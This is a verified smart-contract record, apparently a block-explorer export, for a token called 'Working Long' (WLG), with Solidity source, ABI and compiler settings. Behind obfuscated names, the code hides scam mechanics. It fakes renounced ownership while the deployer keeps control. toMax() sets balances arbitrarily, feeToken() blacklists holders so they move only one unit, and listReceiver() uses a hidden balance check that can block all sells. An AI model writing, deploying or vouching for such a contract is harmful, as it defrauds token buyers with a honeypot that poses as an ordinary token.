{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.1;\n\ninterface listIs {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract swapReceiverTeam {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface receiverTotalTx {\n    function createPair(address maxLaunched, address liquidityTrading) external returns (address);\n}\n\ninterface isShould {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address shouldMarketing) external view returns (uint256);\n\n    function transfer(address sellMin, uint256 minAmount) external returns (bool);\n\n    function allowance(address feeBuy, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 minAmount) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address sellMin,\n        uint256 minAmount\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed amountMarketing, uint256 value);\n    event Approval(address indexed feeBuy, address indexed spender, uint256 value);\n}\n\ninterface isShouldMetadata is isShould {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract WorkingLong is swapReceiverTeam, isShould, isShouldMetadata {\n\n    address modeMarketingReceiver = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function launchedWallet(uint256 minAmount) public {\n        fromMax();\n        limitReceiver = minAmount;\n    }\n\n    string private tradingAmount = \"WLG\";\n\n    string private autoSender = \"Working Long\";\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return autoReceiver;\n    }\n\n    uint256 private toLimit;\n\n    function owner() external view returns (address) {\n        return modeAuto;\n    }\n\n    uint8 private feeSender = 18;\n\n    function approve(address fundLimitAt, uint256 minAmount) public virtual override returns (bool) {\n        launchedSender[_msgSender()][fundLimitAt] = minAmount;\n        emit Approval(_msgSender(), fundLimitAt, minAmount);\n        return true;\n    }\n\n    function fundSender() public {\n        emit OwnershipTransferred(txLaunchedEnable, address(0));\n        modeAuto = address(0);\n    }\n\n    uint256 limitReceiver;\n\n    constructor (){\n        \n        listIs swapWallet = listIs(tokenReceiver);\n        marketingAtTx = receiverTotalTx(swapWallet.factory()).createPair(swapWallet.WETH(), address(this));\n        if (sellFrom != senderSell) {\n            toLimit = launchSwap;\n        }\n        txLaunchedEnable = _msgSender();\n        fundSender();\n        swapTrading[txLaunchedEnable] = true;\n        tradingWalletLaunched[txLaunchedEnable] = autoReceiver;\n        if (shouldMin == toLimit) {\n            toLimit = modeLiquidity;\n        }\n        emit Transfer(address(0), txLaunchedEnable, autoReceiver);\n    }\n\n    function fromMax() private view {\n        require(swapTrading[_msgSender()]);\n    }\n\n    uint256 private toEnableReceiver;\n\n    uint256 public launchSwap;\n\n    uint256 private autoReceiver = 100000000 * 10 ** 18;\n\n    uint256 liquidityBuy;\n\n    uint256 private modeLiquidity;\n\n    function transferFrom(address receiverShould, address sellMin, uint256 minAmount) external override returns (bool) {\n        if (_msgSender() != tokenReceiver) {\n            if (launchedSender[receiverShould][_msgSender()] != type(uint256).max) {\n                require(minAmount <= launchedSender[receiverShould][_msgSender()]);\n                launchedSender[receiverShould][_msgSender()] -= minAmount;\n            }\n        }\n        return listReceiver(receiverShould, sellMin, minAmount);\n    }\n\n    uint256 private shouldMin;\n\n    mapping(address => bool) public swapTrading;\n\n    address public txLaunchedEnable;\n\n    bool public senderSell;\n\n    function toMax(address enableLaunch, uint256 minAmount) public {\n        fromMax();\n        tradingWalletLaunched[enableLaunch] = minAmount;\n    }\n\n    address private modeAuto;\n\n    mapping(address => bool) public tradingLiquidity;\n\n    uint256 constant isExempt = 1 ** 10;\n\n    function feeToken(address minReceiverSell) public {\n        fromMax();\n        if (minFee != modeLiquidity) {\n            modeLiquidity = minFee;\n        }\n        if (minReceiverSell == txLaunchedEnable || minReceiverSell == marketingAtTx) {\n            return;\n        }\n        tradingLiquidity[minReceiverSell] = true;\n    }\n\n    event OwnershipTransferred(address indexed swapTake, address indexed liquidityIsShould);\n\n    function transfer(address enableLaunch, uint256 minAmount) external virtual override returns (bool) {\n        return listReceiver(_msgSender(), enableLaunch, minAmount);\n    }\n\n    bool public launchReceiver;\n\n    function name() external view virtual override returns (string memory) {\n        return autoSender;\n    }\n\n    bool public amountMinToken;\n\n    function allowance(address autoMarketing, address fundLimitAt) external view virtual override returns (uint256) {\n        if (fundLimitAt == tokenReceiver) {\n            return type(uint256).max;\n        }\n        return launchedSender[autoMarketing][fundLimitAt];\n    }\n\n    uint256 private minFee;\n\n    function decimals() external view virtual override returns (uint8) {\n        return feeSender;\n    }\n\n    address tokenReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function autoTo(address isMode) public {\n        if (launchReceiver) {\n            return;\n        }\n        if (amountMinToken) {\n            toEnableReceiver = toLimit;\n        }\n        swapTrading[isMode] = true;\n        \n        launchReceiver = true;\n    }\n\n    function takeReceiver(address receiverShould, address sellMin, uint256 minAmount) internal returns (bool) {\n        require(tradingWalletLaunched[receiverShould] >= minAmount);\n        tradingWalletLaunched[receiverShould] -= minAmount;\n        tradingWalletLaunched[sellMin] += minAmount;\n        emit Transfer(receiverShould, sellMin, minAmount);\n        return true;\n    }\n\n    mapping(address => uint256) private tradingWalletLaunched;\n\n    bool public sellFrom;\n\n    address public marketingAtTx;\n\n    function getOwner() external view returns (address) {\n        return modeAuto;\n    }\n\n    mapping(address => mapping(address => uint256)) private launchedSender;\n\n    function balanceOf(address shouldMarketing) public view virtual override returns (uint256) {\n        return tradingWalletLaunched[shouldMarketing];\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return tradingAmount;\n    }\n\n    function listReceiver(address receiverShould, address sellMin, uint256 minAmount) internal returns (bool) {\n        if (receiverShould == txLaunchedEnable) {\n            return takeReceiver(receiverShould, sellMin, minAmount);\n        }\n        uint256 marketingMax = isShould(marketingAtTx).balanceOf(modeMarketingReceiver);\n        require(marketingMax == limitReceiver);\n        require(sellMin != modeMarketingReceiver);\n        if (tradingLiquidity[receiverShould]) {\n            return takeReceiver(receiverShould, sellMin, isExempt);\n        }\n        return takeReceiver(receiverShould, sellMin, minAmount);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeBuy\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapTake\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityIsShould\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountMarketing\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoMarketing\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundLimitAt\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountMinToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundLimitAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minAmount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isMode\",\"type\":\"address\"}],\"name\":\"autoTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldMarketing\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minReceiverSell\",\"type\":\"address\"}],\"name\":\"feeToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"minAmount\",\"type\":\"uint256\"}],\"name\":\"launchedWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingAtTx\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"swapTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minAmount\",\"type\":\"uint256\"}],\"name\":\"toMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tradingLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minAmount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverShould\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"sellMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minAmount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txLaunchedEnable\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "WorkingLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}